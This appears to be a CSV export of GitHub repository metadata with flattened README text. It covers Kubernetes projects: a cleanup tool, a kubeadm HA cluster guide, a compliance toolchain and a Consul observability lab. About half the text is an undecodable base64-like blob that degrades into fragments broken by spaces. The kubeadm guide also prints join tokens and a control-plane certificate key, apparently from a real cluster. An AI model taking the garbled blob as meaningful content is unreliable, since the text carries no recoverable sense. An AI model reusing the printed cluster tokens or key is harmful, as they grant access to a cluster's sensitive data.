FWVg6shFoBBqBRqARaAQagUagEWgEGoFGoBFoBLZBoA0L26DUeRqBRqARaAQagUagEWgEGoFGoBFoBBqBRmAWgTYszMLSkY1AI9AINAKNQCPQCDQCjUAj0Ag0Ao1AI7ANAm1Y2AalztMINAKNQCPQCDQCjUAj0Ag0Ao1AI9AINAKzCLRhYRaWjmwEGoFGoBFoBBqBRqARaAQagUagEWgEGoFtEGjDwjYodZ5GoBFoBBqBRqARaAQagUagEWgEGoFGoBGYRaANC7OwdGQj0Ag0Ao1AI9AINAKNQCPQCDQCjUAj0Ahsg0AbFrZBqfM0Ao1AI9AINAKNQCPQCDQCjUAj0Ag0Ao3ALAJtWJiFpSMbgUagEWgEGoFGoBFoBBqBRqARaAQagUZgGwTasLANSp2nEWgEGoFGoBFoBBqBRqARaAQagUagEWgEZhFow8IsLB3ZCDQCjUAj0Ag0Ao1AI9AINAKNQCPQCDQC2yDQhoVtUOo8jUAj0Ag0Ao1AI9AINAKNQCPQCDQCjUAjMItAGxZmYenIRqARaAQagUagEWgEGoFGoBFoBBqBRqAR2AaBNixsg1LnaQQagUagEWgEGoFGoBFoBBqBRqARaAQagVkE2rAwC0tHNgKNQCPQCDQCjUAj0Ag0Ao1AI9AINAKNwDYItGFhG5Q6TyPQCDQCjUAj0Ag0Ao1AI9AINAKNQCPQCMwi0IaFWVg6shFoBBqBRqARaAQagUagEWgEGoFGoBFoBLZBoA0L26DUeRqBRqARaAQagUagEWgEGoFGoBFoBBqBRmAWgTYszMLSkY1AI9AINAKNQCPQCDQCjUAj0Ag0Ao1AI7ANAm1Y2AalztMINAKNQCPQCDQCjUAj0Ag0Ao1AI9AINAKzCLRhYRaWjmwEGoFGoBFoBBqBRqARaAQagUagEWgEGoFtEGjDwjYodZ5GoBFoBBqBRqARaAQagUagEWgEGoFGoBGYRaANC7OwdGQj0Ag0Ao1AI9AINAKNQCPQCDQCjUAj0Ahsg0AbFrZBqfM0Ao1AI9AINAKNQCPQCDQCjUAj0Ag0Ao3ALAJtWJiFpSMbgUagEWgEGoFGoBFoBBqBRqARaAQagUZgGwTasLANSp2nEWgEGoFGoBFoBBqBRqARaAQagUagEWgEZhFow8IsLB3ZCDQCjUAj0Ag0Ao1AI9AINAKNQCPQCDQC2yDQhoVtUOo8jUAj0Ag0Ao1AI9AINAKNQCPQCDQCjUAjMItAGxZmYenIRqARaAQagUagEWgEGoFGoBFoBBqBRqAR2AaBNixsg1LnaQQagUagEWgEGoFGoBFoBBqBRqARaAQagVkE2rAwC0tHNgKNQCPQCDQCjUAj0Ag0Ao1AI9AINAKNwDYItGFhG5Q6TyPQCDQCjUAj0Ag0Ao1AI9AINAKNQCPQCMwi0IaFWVg6shFoBBqBRqARaAQagUagEWgEGoFGoBFoBLZBoA0L26DUeRqBRqARaAQagUagEWgEGoFGoBFoBBqBRmAWgTYszMLSkY1AI9AINAKNQCPQCDQCjUAj0Ag0Ao1AI7ANAm1Y2AalztMINAKNQCPQCDQCjUAj0Ag0Ao1AI9AINAKzCLRhYRaWjmwEGoFGoBFoBBqBRqARaAQagUagEWgEGoFtEGjDwjYodZ5GoBFoBBqBRqARaAQagUagEWgEGoFGoBGYRaANC7OwdGQj0Ag0Ao1AI9AINAKNQCPQCDQCjUAj0Ahsg0AbFrZBqfM0Ao1AI9AINAKNQCPQCDQCjUAj0Ag0Ao3ALAJtWJiFpSMbgUagEWgEGoFGoBFoBBqBRqARaAQagUZgGwTasLANSp3nWoXAe97zntU dM XavavK6x Vf 7UuudOuhQj8wz 8w oP uAPVn zN39zxrT ox 96Oqzn 3sadeez3zmM6u uu Pu3kaoHWI Av IvqyuvvHL1gQ98YPWP iP6zN3aiPQCDQCjUAjcAYgcL0zoA2ndRP d ffWv qvK4OMGjq vWvv7rVrW51Wst TRGO8vs5n3PidrJPfepTq9 6rd ajlve8paru9 97qsv uIvvqbAcOBy uEf uHqN3 zN1fXve51V e85z1X3 iN33jgdVwbGf7Hf zHMe D n74gi 4gtU3fdM3ndawvPrVr1597GMfm2TUN776q796epfd5ja3WX3RF33RaS37nHB qd unrFK14x9fNv ZvX33v937vdD6X92THPec5z1n98z 8 oGN7jB6k53utNp3zdONj6na31 8id snrXu961K97nfd7nrW52s5utbn 726 7uu bje TxqBRqARaAQagTMFgevszNBMUzQf jHpzbd8IY3PFPadlLbQSF9 ctfvqIw Od ueKortp9ut617ve6id 4icmOTflPamNuQZW9oxnPGNlZu LvuzLVje5yU1WR44cWd3iFrdYXec619lTa172spetrrrqqmPKfMu3fMvqbne720lTNMxu f7v 7qm7 5m1df ZVfeYws48Uf dEfrd7xjnesfuAHfmBS7sb0E7n t3 7t9VFF1009efw Y7v I7V0aNHp8vus0FlOfQueNaznjW9F7wbtnkv4PbEJz5xYno6YvyXf mXq8suu2yx0YxPZ5111sb33yKDU5CgPdoV8m7 u pX firvwYc 9KHVr 6r0esKWR4uutd7zoZGE6lbMcINVwwRn7hF37h6ru 7tXn 5nz kLl96n3l H7Rx6v3vf q7W9 oOd7jD9F5dluBgU37t135t9ZGPfOQ4pl 6pV 6uv 97z 930 Xe3ic0B3RCDQCjUAj0AhsQOC6 2eH5OHaig76D31iei344RLMhZ4ise1AwUzf93zP9 xZ T0MOLn 8Vf MXUDwyqP dzP cwqjk0ngak2mDmVzuicLu c1vvlW9FOnXve51x WlcBiYGpSeDHrjG9 4eve73z31p e 970rXi9f8zVfM2vY4I7 4Q9 eCWfGeQb3ehGK4rHQdBrX vaY5QtPP 8z 989Wd 9mcrM9MH4SFyEHKezjwYEt70pjft6b2gPd 3fd93WrwX5rBlfDODvkQ3vvGNV1 9V8 yb tu3CJ18mI u vpHtW63DcGxj 4z eFHjvxFNBFFPvpUoMVGbDLd1g9Nyr8bTyGs 1VYYM 2MU P3Sb zGb6w 8YlPTEbPT3 609MMvRn7TcQ7453vfOfq7 7u76b39kG8Y wvvPjFL54MzzxTPvnJT06eV 5 D5t4HrlX4 PCY9E7mxGOAaapEWgEGoFGoBE4ExA4NaOlMwG5oQ0MMmYhzDYblG1LBk4G3zm2LXci f7qr 5q9bu 7urv 3bv50MCQauowJgsGogqF3cNrkGn85LAs4555zVJZdcMrmXBxsDcINU65PPPvvsKTrtZCjg5m9mNTNq8iY9PBLy5HGvKBxoKV yn0jIFdu6XHUZFL 1rW9dve1tb5tczXkLVONfHXjzOvqVX mVyVODy SJDJwNhD 4wQ ONoPCoJ7zzz9 ReE6TCxmBbgGRbo X EVX7GivOqP29KpeC9sI5s Vmf258p867d 69T39F9943TvH56vJfKu1GbLotDJbAsleN3afMZsz hBvZMo3Gb1EUy0 X73u990vdd2 AP uDqiiuumPDyHvGuve1tbzt5Wmx6L6nL 4 3Bq Rb iGbzgh3CPH1JCdH4bRiy ePWIRzxiWo6417aFzzYh3v57eNTlPqWca3jf 973ntI2yeF nd 53cmg08vSQuKHTYCjUAj0AicTgj0UogDvBuUcQqBGWSzeuNAYqyKV8BP RPT4OmuEmPeQ7y2sDxDW94w8qyjf2Qmf873 nOq9N1uYyZsWc 9mzuP 4j 4ZCgxeOOa tKXvnSC4DGPecy0dtm9etrTnnbc7KB7 sM MPTMgNl5dvklWKWkyuwZQwPeMAD9jUj5R698IUvPK4t5DEQ5TFAnit3Nger63j3c1 3W8a6 vPOO2 ScdOgeL91nCnlvBcoNJZL8UDZRD zMz9z0t4Lm2Sp6QxKnrORqiGEselxj3vcZIjc9KyMfE72tef5l3 5lxeNwRRkhhL9O205WX3dEhoGqZHg 8AHPnDyCiHLNu kkcfc9TOf czjNq3ltcBo672z13bHIFrrIrt9ayzzmuP35Cc eTa 8jioc55dF1544VbvLwYezy6vtb0q9bDj cVDYSTvccYb99Axh4ky0vy35dk7srPUz39LnruRb183Ao1AI9AINAKnAoET3 3uVEh9GtdpYMAN L73ve9WUhp0HDYZjPzqr 7qpKguGRXsTXDTm9509SVf8iWL4lDIuaq 8pWvXMxzKhO Mu fFrTOycD11ODMN4LjD7odre73bQng3geHKPLsTw2LLQMYVuiPJohYyiybIAXBcz3ep 9mu dlIexnr1L27GBrp4kv1UERde9Tv22r5TJfOprJcy8LCHPWwrEU5HPM0gR7EZG0H5tO4f6fveN8LTsR1V9ixfq3H13Ox62pCwph WuWUYc0YFMjDmjZv eje 5S1vmZRXng7K7 V4 etff5xRQdssr3re8543Kbx7bb9lfva5qaRP2PjzVa961YTryHO8rmUP pwH3rbvL94hPHXIzfuAR8W2snpn3 GOd5wV31KWbd6fNhatz5576xljpNxWjlkBOrIRaAQagUagEThABHopxAGCmdkGM1vcN 3hJ 4Aq9kTK4OhF7zgBYszctzqKTtf9VVftcvXoOXyyy fZkl2I8uJNaPPfe5zpwGu6FPdxoiWAZyNDxkSKjE6UMYNks3 UIqP7iwrMKiTl2FhjiyPcKBt2jl fs9AGv73uc99ppmubXikLh4i3 Vd37X6vd 7van sOAYSaV CMpY1ZQXXP1 fzP xx8Y9 9KMXN4rMwDVh6gv MT7pHf4PArDS7zxnlt6M fN cp6eZ5RcXjhzxIvJUgGGkze c2Tgc5SGv2eu np8B6ck1ucjU XESMe5djsdvr7uvwHlcazbI5s MfQGVn0KYelUpYoHQbZswYOjOXqUvc2JJ9ZdYr4uMeApRE832zuiMJzfJd4T Ij zIMXlc6GeWEVhm5P5YZmEp4hxZymKPhUr6KmNY3p Bs ap53V CG1hHLEXDvn9t0T Wqaea9f4HGi OIag3Mc5Pv5v SePxNDAg iCCy7oJWkjOH3dCDQCjUAjcEoQaMPCAcOeAYoBgxmRdWtkD7jq49gZEBrcG7TMkdk4gzaKTuSWj0LL2EAJXyLrb7l3mtFHcwOipbKHHe8LCXUndZ4YFHyDMCEy4OWWi7RjCaNN68knBht YEMeyuS3fdu3HYP1uqLK2dvCUofRmyKzbXPrlefiUo NLMd7xbXXsgbxY5pyiUsYXjWtxvX58QgEW 8FighvlmsKMZRaliMciUFBHw2ZpY5SrI0MlD 0Qz80KXBz SflTkVIvmxaXOun8NnnxGdntZlS shHPrJmOdRzRsM6O53KuOHbDDB9qSqjjInxxEr gwwp05Tw3MOEm rQ321E prXvOa4rDae1XfSr Z4Kj9n1LH3DGLIdTAQeY9ZIjJSNQokjaHX z9YJn4pnNvM2Ls0fX2p3Lp43nOejxMh4wsbfD70oQ dk9HnROrsso1AI9AINAKNwBICbVhYQuYE4w1YDIpOJZllWlKYycV1uRoVMlCVZsNGs0HjDLy0kDWjNtfKrtZzA8PkPZmhASa3YJtTUrINIq1PzazZrW996 l74u4PAwm31kriLZPQnngrwIkXytwgNWXtZG52aYlsvOXzdXDeFiuyuE91YC4uX7pwPpI4 B0G7bUu 2xUoixYR47ki2y1TM0 dy7vXvLP8bi2xMFp7p6dzu23tjyKXJXz te jGbouo7nhszyclPSfbJ0oc85CHTDPXp1E mvgCjfZRTxh 7l2iTZ8ZXWsyK59mqOBz0 ZxcvrTBYIpgSK4c4o7szMD7JK53trzeV uh9M2E4aFOh dFDAFJWxcqw90fluPeIoyl6qk863nlmzZHjlE efNlIP9H8iHhkrwjz6nAws cYUHW PeNxbRNvYwic7LO5SfPfu6b5YtwQ pE2j7W0deNQCPQCDQCjcBhI9CGhcNG BTx515JsV5H2QAwgy DEuTaYIgSbNZuHZkpustd7nJaDWjI 6AHPWgaaNokjFLOgIAMEBkatM Az0xsJfFmf47sDNTrpoi8Dd73vvdNBol73OMex2xgmYHc3IzhDW5wgwlHGzly1c0AUJmUq WP5 IYmHO7jfu8 4IPhW2OUof7qYw2py6KXqXb3 720 A48mRg6tqMnDXFZnC5u MbPpVHn5 5CHCxH uM1jLYPepRj5pCfUK yfvD83PppZfu9hX9yN4sDGT67unQhxgK8k6od4 R0XIVMjIkctlHvJrsnUNRRIfVht 7d8 bm8F7w5LSuDr RSsRxl4WXhG8 xPgu7xJzwT1uJzcTV96Vy57 zO75y NFHzWIanPTnkG2WXFtLuyDB6Zcln Rfj7vOf zpP nIzjscpcx0MfxIq3yH5N3Lsb4k NRP dQu 1qP s4g5f3LSKXv6PvOQ2ROmac emT7Iwv p x5BVv8RUsch5ygsTF 4dNgKNQCPQCDQCJxuB4xdon2wJur5DQSAz7euYm3FEGVgZnNSBitmvTWS5hcGgQc3pNLCh0Gd Al pCNmBO14H2QQxaUJu2wakcKBUVRJnkzSfKrPm3HWw45Jqc7tKvDme8IQnrLiH22yt7mNR8206V08U 5vd7Gare93rXtO CwbRlLaRch9syGbHewaPuFbXddgGy5Q9 GtbnCNuupRKfck6aYpYeI919vWZh4B7P cpRs 7pVLeH k3eQ5cM6Dpo5XEm7V yUteMj0zp7If8Vyac2GP0ZHc5K1LPLSP19NhbpZnaYb9YSp5j kqDZl 7ud bpLB8izyOSoljqyMpg5Lvw7qCM x3irD0rllHKPRIF9XqH2hnuM1XqeNo6Lv3llm9qIXvWjysrM8gAfDOgqvdXmSNtaX IRLmIjn9WefHO9Qxmkkvj4zKe9eMUgwJHt31 8UeXIoO1c 8nTYCDQCjUAj0AicCgTaY FUoH4S6owiua4qSqavD2SwMuY1o7SJuDwb I0DwE3lDjtdmwzmqoGFUm4mCPkkZAZ5kaVusGj965LHhxl8LrB1YGczL3UiWDBQZOAcfBMqV4mxwgyqGUcyzpHZK5s1GuCmbfIxgmRWNeUygGd0kJdhxcFFmiEoRGlRb SqISUHBqHPfOYz04ad9VOXSevwzEOA8moJxEgUOJ4KmdXXZ6qSI784ewHoc6Nyx1jB0 bo0aO7 wWMdRz2tf1OxmdQnfZdqUvDfCnH3iN5ZhgPfQKSos84qZ0HRRRKynAlLu4 h2svgGwuS n0NQDPvf1txne0dtV38UHKWGXb67n3lj6Rdy65GUtRlTHvrsr gx 84LSHAkOWcvL7WkUlSw94CdS9aHhbMXJVPGqZvZzPyZXy5MkzkLjs35NrIQwY65O3tnsuvzrTXmUYtWDB03AuP36VZ627zxuBRqARaAQagZOBQBsWTgbKp6AOiuAmslyCYWGJDGY2EeUUGbw5TvbAhvJMGRgHj29605umtd6R36AuG3vZsG1UmrjR1o0V7Tq RMqbvcMTRgwQ2VtB3Lnnnru60Y1uNGEBD3ky6As CdXByOFeOLhaW55grXodPCY XvJpN Vmzqskg BaXj12R69E7rp3Q02bOycDLw8y2onddeSay99x10wEKP 8XMbnn1v2BTs70FN4c 89B nfaa3 rF9Rfu3VQhmuxD3cFybMyvLqsdTnZPUjho7xOSAbjyJH2pU2Ud59ASfEkGqZx nnnz89Bwclt cqS53UxWWeASOGDgbASlddddXkOcVAk dW0g9KpvA7qNAeEAyyDu 4GGeCuXrG97hrRq7RkDAn07jRLr423rQs7kQp79TKp8qa hLsGeBG8uwwSidPDcd3tbL6GMNWnkP9kPcDzx MXn3h89YX183Ao1AI9AINAInG4E2LJxsxE9SfQY2Bv3ryAaHZtXrus aP5sd1rjxnOKwVyIXpdYgSUhJpqyYITTDJMxAy2Axs1wGozFkpM5nPvOZUzsNwKWZ bNMYWy7fREMaA3e69chDA4NeLnqGqA5zNSPXgDq4zVgw0qzYtyiH vYx05ixAhBZoNBa6IRXgaF46BzSiw lAPeI CABX5c0K3J5Y7NWIHCj9EE2cCxDm6nyJ2fDIKDYeKFWf7iPGXxHUkbq6JT083cqiPtqmln2jlFklLDmKTdcIGr uazf7444vywiRw8Wyx IYOZTPfyJje5yfTsHFT9ZkSr90348lA477zzjlEG54wKnmceAfoUJd4zB6dPfepTYbUbMn4yQNhXwJcDeOTM9cXdAid4AjdtG8n98xlHlGcsfduz7DmDfch7McaFzCgnbT8hd cYJpWnTPIK0c Iw5A49yyS0R44DDjefYeJ3X7aVcvw rC0jBHEfgP1 aEdoby7ci20pM37EB7aKfQcVOO5d5l NpL kjmeY75N13lXrstX8Z rM0vwar6cz X37IS88 0 IJ4LjAyWI krTY1AI9AINAKNwOmCQBsWTpc7cbUcBq1cOjPg2EY8gyeDjEriuLOvIwM6dZkZy3rpmn8bw0Lc Wu5pXNKOWPGNnzNjlq2YPY0AyrLBBgeUPAxUPXZMgPvccYqcjCcWGbA6EAhSP0GbnVwhic l1122e4sUXgYFFoqAVN7DVCgXvrSl05eEL5lbuBpE0u4I7woXsIc4TWGDAc2ZyMb5RW5N9Zbm6n0 fh4CBhQR0mzMeVcmw280TgYNii35wN55qjGM87YUKwSfowwDDxpkzh7OcwZYmrZpXPeD rfHJk1H uwtpn5i7GllrNpG3w2kcH4ullMCqh SuGj0G8ifYOyxOsl2G8qs206GewHMPdZxPDwrPBwsUHeiZD RskfiVFB 6T8UGr0zRy1z4izL0eNo zBk4I t1miuhjTfAnBV1O0gcs8Q NBE6 A0eCoDt5F ntmk7Wjkq8xXHLJJTVqktnzypAYD45jMmx54V3EeyPEiGHzS88VHMky7vWSvJ5nBlFyy5f3TdIPIlS39 ad7nSn2Wdu2zos89AXGEkYoy0Vi1Em75I5XnDwjvjf t T2107WBQ8fWREEN63iO1 0n 6Ec mmz7DucUf3Lsh3JfRzmXeHkHjn3AvfYpacY 2 b8lqqo MbgUagEWgEGoGDQKANCweB4gHyMMiuMzHbsDZgN DJ4EJoID8qZXO8KAo2I7zjHe 4ioKcfFlbnOsxNINPSVNfjjGPawYFCgsFY1ui0DEYVCIrhTIDf3VS5s3sUyqXcMsSCF4GUTwZLWzkGJdVvPD1lQj3YCQeDzA2kKegILOMvB8e OAHr84666zdmTF8cuC7DVFIubdSYKryY1BPwc6mkhReZFBLmZ27R9sot3NyzcVV2Y ueFaYPRzzkWEOs1p26ZwhZ y78uJ31Y679xyZVc sdpXFc1CxmysrjjFmrk684OtLJ ljSzxqvH7tk6WMAD7dGZf6mmev5xROfXrOcDTy8qxQysmtL0ZBHvOtu2a8GJ 35CfDk570pFzuOXRPeAExDFLy6j2rzPQF3joORj GNOvJeYWcKHkH1U1cww9W4r0Dvcu8T3iBVBkZXfW397znPSk2he6759VyjhjbjsmwxQWFO33Ws UZi8KqD3qnzS0DYMD80R 90akGsirjqHJvUf3aLJ6F7O3Aa8z7ackzwvPqXTpn8INbfTdbGsNo6Z2ZPW8iSNqe64TalbYlTFoN5 Kty1 Lrjufk8v9 dmf dl1xY5Je pTn3rM9aaLTfn1m c973lTP4D7QbRzk0yd3gg0Ao1AI9AIrEOgDQvr0DkFaWZnDHDN0lMqNxEl0uAsA4s6SDWY3oYMSMyIUEx8wcDsp4HU3EA8 AwwKVGoDuaSnhDfuZ3lpauDcnxkx5VXWy0HUCc,2020-11-16T06:15:19Z,2020-12-04T02:31:06Z,JavaScript,User,1,2,0,2,main,TateBrownJava,1,0,0,0,0,0,0
shindesanket,CKA-K8S,,Certified Kubernetes Administrator,2020-09-05T05:14:00Z,2020-10-31T10:03:59Z,HTML,User,2,1,13,29,master,sanketshinde-cloud#shindesanket,2,0,0,0,0,0,0
jonathanbaraldi,k8s-cleanup,,k8s cleanup 3 maneiras de limpar seu cluster kubernetes Limpar containers imagens coisas pendentes volumes etc DaemonSet docker clean yml Limpar replicaset s jobs pods itens n o recicldos pelo Kubernetes CronJob k8s clean yml Limpar diretrios n o mais usados pelo etcd CronJob etcd empty dir cleanup yml Env vars No Daermonset docker clean yml voc pode setar DOCKERCLEANINTERVAL para modificar o intervalo Padr o de to 30min 1800s No CronJob k8s clean yml voc pode setar DAYS para modificar o mximo de idade que as velhas rplicasset podem ter Padr o de 7 dias Deployment sh kubectl n kube system apply f rbac yml kubectl n kube system apply f docker clean yml kubectl n kube system apply f k8s clean yml kubectl n kube system apply f etcd empty dir cleanup yml Agradecimentos Este repositrio baseado no https github com onfido k8s cleanup Todos mritos a ele que fez Porm tem alguns erros e itens desatualizados foi corrigido e coloquei a disposi o no curso https www udemy com course devops mao na massa docker kubernetes rancher,2020-08-31T13:45:51Z,2020-12-23T02:12:59Z,Shell,User,2,1,4,2,master,jonathanbaraldi,1,0,0,0,0,0,0
connectbaseer,vagrant-centos-k8s-ha-cluster,,Kubernetes HA Cluster using kubeadm VM Config Using Vagrant to Automate the VM installtion for HA Cluster No of Master Nodes 2 2CPUs 2GB RAM and running centos7 No of Worker Nodes 2 1CPUs 2GB RAM and running centos7 No of LoadBalancer Node 1 1CPUs 2GB and RAM running centos7 Vagrant Requirement Download Vagrant from https www vagrantup com downloads an install Download this code and open the terminal from the code directory and run cd c k8s ha cluster abdul DESKTOP SDC795Q MINGW64 c k8s ha cluster master vagrant up Installing Kubeadm Installation should be done on all the nodes System Requirement One or more machines running one of Ubuntu 16 04 Debian 9 CentOS 7 Red Hat Enterprise Linux RHEL 7 Fedora 25 HypriotOS v1 0 1 Container Linux tested with 1800 6 0 2 GB or more of RAM per machine any less will leave little room for your apps 2 CPUs or more Full network connectivity between all machines in the cluster public or private network is fine If you have more than one network adapter and your Kubernetes components are not reachable on the default route we recommend you add IP route s so Kubernetes cluster addresses go via the appropriate adapter Step 1 Load the brnetfilter module All Nodes sudo modprobe brnetfilter Step 2 Turn Off swap All Nodes swapoff a Step 3 Letting iptables see bridged traffic All Nodes cat EOF sudo tee etc sysctl d k8s conf net bridge bridge nf call ip6tables 1 net bridge bridge nf call iptables 1 EOF sudo sysctl system Step 4 Installing container run time All Nodes Install Required Packages yum install y yum utils device mapper persistent data lvm2 Add the docker repository yum config manager add repo https download docker com linux centos docker ce repo Install docker ce yum update y yum install y containerd io 1 2 13 docker ce 19 03 11 docker ce cli 19 03 11 Create directory for docker daemon mkdir etc docker Setup Docker daemon cat etc docker daemon json EOF exec opts native cgroupdriver systemd log driver json file log opts max size 100m storage driver overlay2 storage opts overlay2 overridekernelcheck true EOF mkdir p etc systemd system docker service d systemctl daemon reload systemctl restart docker sudo systemctl enable docker Step 5 Installing kubeadm kubelet and kubectl All Nodes Install these packages on all of your machines kubeadm the command to bootstrap the cluster kubelet the component that runs on all of the machines in your cluster and does things like starting pods and containers kubectl the command line util to talk to your cluster cat EOF sudo tee etc yum repos d kubernetes repo kubernetes name Kubernetes baseurl https packages cloud google com yum repos kubernetes el7 basearch enabled 1 gpgcheck 1 repogpgcheck 1 gpgkey https packages cloud google com yum doc yum key gpg https packages cloud google com yum doc rpm package key gpg exclude kubelet kubeadm kubectl EOF Set SELinux in permissive mode effectively disabling it sudo setenforce 0 sudo sed i s SELINUX enforcing SELINUX permissive etc selinux config sudo yum install y kubelet kubeadm kubectl disableexcludes kubernetes sudo systemctl enable now kubelet Cluster Installation HA Control Plane Installation Stacked ETCD Step 1 LB Configuration Install Nginx sudo yum install epel release sudo yum install nginx Disable Selinux SELINUX disabled in the cat etc selinux config and reboot the server Start Nginx sudo systemctl start nginx Nginx configuration Create directory for loadbalancing config mkdir p etc nginx tcp conf d Add this directory path to the nginx config file etc nginx nginx conf vi etc nginx nginx conf including directory for tcp load balancing include etc nginx tcp conf d conf create config for api server loadbalancing vi etc nginx tcp conf d apiserver conf stream upstream apiserverread server 192 168 30 5 6443 control plane node 1 ip and kube api port server 192 168 30 6 6443 control plane node 2 ip and kube api port server listen 6443 port on which load balancer will listen proxypass apiserverread Reload the config nginx s reload Test the proxy yum install nc y nc v LOADBALANCERIP PORT A connection refused error is expected because the apiserver is not yet running A timeout however means the load balancer cannot communicate with the control plane node Step 2 Install kubeadm kubelet and kubectl on all the nodes please refer the kubeadm installation section Step 3 Initialize any one of the control plane node sudo kubeadm init control plane endpoint LOADBALANCERDNS LOADBALANCERPORT upload certs You can use the kubernetes version flag to set the Kubernetes version to use It is recommended that the versions of kubeadm kubelet kubectl and Kubernetes match The control plane endpoint flag should be set to the address or DNS and port of the load balancer The upload certs flag is used to upload the certificates that should be shared across all the control plane instances to the cluster If instead you prefer to copy certs across control plane nodes manually or using automation tools please remove this flag and refer to Manual certificate distribution section below Some CNI network plugins require additional configuration for example specifying the pod IP CIDR while others do not See the CNI network documentation To add a pod CIDR pass the flag pod network cidr or if you are using a kubeadm configuration file set the podSubnet field under the networking object of ClusterConfiguration sudo kubeadm init control plane endpoint k8s lb 6443 upload certs pod network cidr 10 244 0 0 16 apiserver advertise address 192 168 30 5 apiserver advertise address 192 168 30 5 address of the current master node Output after success You can now join any number of control plane node by running the following command on each as a root kubeadm join 192 168 0 200 6443 token 9vr73a a8uxyaju799qwdjv discovery token ca cert hash sha256 7c2e69131a36ae2a042a339b33381c6d0d43887e2de83720eff5359e26aec866 control plane certificate key f8902e114ef118304e561c3ecd4d0b543adc226b7a07f675f56564185ffe0c07 Please note that the certificate key gives access to cluster sensitive data keep it secret As a safeguard uploaded certs will be deleted in two hours If necessary you can use kubeadm init phase upload certs to reload certs afterward Then you can join any number of worker nodes by running the following on each as root kubeadm join 192 168 0 200 6443 token 9vr73a a8uxyaju799qwdjv discovery token ca cert hash sha256 7c2e69131a36ae2a042a339b33381c6d0d43887e2de83720eff5359e26aec866 To start using your cluster you need to run the following as a regular user mkdir p HOME kube sudo cp i etc kubernetes admin conf HOME kube config sudo chown id u id g HOME kube config Step 4 kubectl config mkdir p HOME kube sudo cp i etc kubernetes admin conf HOME kube config sudo chown id u id g HOME kube config Step 5 Join the other master Note Run as root kubeadm join 192 168 0 200 6443 token 9vr73a a8uxyaju799qwdjv discovery token ca cert hash sha256 7c2e69131a36ae2a042a339b33381c6d0d43887e2de83720eff5359e26aec866 control plane certificate key f8902e114ef118304e561c3ecd4d0b543adc226b7a07f675f56564185ffe0c07 apiserver advertise address 192 168 56 3 apiserver advertise address 192 168 56 3 address of the current master node Step 6 Create a CNI for POD networking Note Run on control plane node with non root user kubectl apply f https cloud weave works k8s net k8s version kubectl version base64 tr d n Join the other master node using Step 7 Joint the worker nodes Note Run as root kubeadm join 192 168 0 200 6443 token 9vr73a a8uxyaju799qwdjv discovery token ca cert hash sha256 7c2e69131a36ae2a042a339b33381c6d0d43887e2de83720eff5359e26aec866,2020-08-25T13:29:32Z,2020-12-19T19:04:32Z,Shell,User,1,1,6,14,master,connectbaseer,1,0,0,0,0,0,2
cloudxlab,factorial-project-multi-container-k8s,,,2020-10-03T11:33:24Z,2020-10-16T23:08:21Z,JavaScript,Organization,2,1,6,1,master,singhabhinav,1,0,0,0,0,0,0
M-Ghani97,jenkins-k8s,,,2020-08-28T07:17:33Z,2020-09-03T04:30:53Z,JavaScript,User,1,1,3,25,master,M-Ghani97,1,0,0,0,0,0,0
QMSTR,qmstr_k8s,,Quartermaster the FOSS Compliance Toolchain that is itself FOSS Quartermaster http qmstr org is a suite of command line tools and build system extensions that instruments software builds to create FOSS compliance documentation and support compliance decisions It executes as part of a software build process to generate reports about the analyzed product Usage See the deployment instructions deploy README md deployment instructions How it works Quartermaster runs adjacent to a software build process A master process collects information about the software that is built Once the build is complete the master executes a number of analysis tools and finally a number of reporters Which exactly is configured in a configuration file called qmstr yaml that usually resides in the root directory of the repository Current status As of now Quartermaster only analyzes Maven projects and stores license and compliance information in its database deploy README md results,2020-10-28T11:06:31Z,2020-12-17T10:21:35Z,Go,Organization,2,1,3,273,main,mirkoboehm#marcomicera#fullsushidev#sebastian-su#thegrumpylion#somayeh-najafi#ikerperezdelpalomar#failgracefully#zetoph#danielriesner#dreh23#dependabot[bot]#lisa-noeth,13,0,0,1,2,0,3
KnowledgeHut-AWS,observability-lab,,Service Mesh Observability Layer 7 Observability with Consul Service Mesh and ProGraf What Learn how to observe the behaviour of your interservice communication in real time The intelligence you gather will enable you to tune your platform for higher levels of performance to more readily diagnose problems and for security purposes How Use Grafana to observe Consul Connect service mesh metrics collected by Prometheus Still What 1 Configure Consul to expose Envoy metrics to Prometheus 2 Deploy Consul using the official helm chart 3 Deploy Prometheus and Grafana using their official Helm charts 4 Deploy a multi tier demo application that is configured to be scraped by Prometheus 5 Start a traffic simulation deployment and observe the application traffic in Grafana Pre requites Most people can run this on their laptops and if you can then this is the recommended approach If your laptop runs out of steam try it on Sandbox You ll need curl jq vim git make docker helm and kubectl installed These tools already exist in the sandbox but you might have to install them onto your local machines if you are running the lab there They generally useful for everything we re doing anyway so why not Let s start making things You will progress faster if you use a makefile for your commands Start with the following and we ll add more to it as we progress Makefile makefile PHONY up down cluster install list all up install up cluster init down k3d cluster delete labs cluster k3d cluster create labs p 80 80 loadbalancer p 443 443 loadbalancer p 30000 32767 30000 32767 server 0 v etc machine id etc machine id ro v var log journal var log journal ro v var run docker sock var run docker sock k3s server arg no deploy traefik agents 3 list helm list all namespaces init logs repos namespaces logs touch output log repos helm repo add stable https kubernetes charts storage googleapis com helm repo add hashicorp https helm releases hashicorp com helm repo add ingress nginx https kubernetes github io ingress nginx helm repo add prometheus community https prometheus community github io helm charts helm repo add grafana https grafana github io helm charts helm repo update namespaces kubectl create namespace consul kubectl create namespace vault kubectl create namespace elf kubectl create namespace prograf kubectl create namespace ingress nginx Note If you intend to copy paste this text in vim watch out for transcription errors especially with quote marks Running make or make cluster will create a k3d cluster capable of running this lab You are all familiar with makefiles so we wont delve into this file any further but we will be adding more to it as we proceed Note though that we have asked K3D not to install Traefik as an ingress controller We will use ingress nginx for this lab if necessary The list target exists to examine and possibly debug our work via helm There are a few more namespaces and repos in that makefile than we ll use immediately in this lab They are for future expansion Installing Consul We will install consul from the official helm chart with the following values which are in kept in the helm directory helm consul values yaml yaml global name consul datacenter dc1 server replicas 1 bootstrapExpect 1 disruptionBudget enabled true maxUnavailable 0 client enabled true grpc true ui enabled true service type NodePort connectInject enabled true default true centralConfig enabled true defaultProtocol http proxyDefaults envoyprometheusbindaddr 0 0 0 0 9102 The centralConfig section enables L7 telemetry and is configured for prometheus though you could actually use any observer capable of storing and reporting on time series data Review the proxyDefaults entry This entry injects a proxy defaults Consul configuration entry for the envoyprometheusbindaddr setting that is applied to all Envoy proxy instances Consul then uses that setting to configure where Envoy will publish Prometheus metrics This is important because you will need to annotate your pods with this port so that Prometheus can scrape them We will cover this in more detail later in the tutorial We give the consul installation commands via make as usual Add the following to the Makefile Makefile makefile install install consul install consul helm install consul hashicorp consul f helm consul values yaml n consul tee a output log delete consul helm 